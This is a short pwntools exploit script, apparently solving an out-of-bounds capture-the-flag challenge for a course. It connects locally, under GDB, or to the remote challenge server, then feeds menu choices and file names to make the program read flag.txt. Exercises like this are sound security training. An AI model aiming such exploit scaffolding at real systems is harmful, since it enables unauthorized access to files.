from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-oob-1.chals.io", 443, ssl=True, sni="cse4850-oob-1.chals.io")
    else:
        return process(e.path)
    
p = start()
p.sendline(b"1")
p.sendline(b"feelGood.txt")
p.sendline(b"0")
p.sendline(b"1")
p.sendline("flag.txt")
p.interactive()
